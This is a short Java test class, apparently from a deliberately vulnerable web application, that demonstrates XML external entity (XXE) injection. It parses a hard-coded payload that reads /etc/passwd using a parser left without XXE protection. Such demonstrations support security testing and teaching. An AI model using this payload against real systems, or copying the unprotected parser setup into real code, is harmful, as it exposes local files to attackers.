package cn.bestsec.vulweb.test;

import org.w3c.dom.Document;
import org.xml.sax.InputSource;

import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;
import javax.xml.parsers.ParserConfigurationException;
import java.io.StringReader;

public class XXETest {
    public static void main(String[] args) {
        System.out.println("xxe test");
    }

    public void test() throws ParserConfigurationException {
        DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
        DocumentBuilder db = dbf.newDocumentBuilder();

        // 包含外部实体的恶意XML
        String xml = "<?xml version=\"1.0\"?>"
                + "<!DOCTYPE root ["
                + "  <!ELEMENT root ANY >"
                + "  <!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]>"
                + "<root>&xxe;</root>";

        // 解析恶意XML
        Document doc = db.parse(new InputSource(new StringReader(xml)));
    }
}
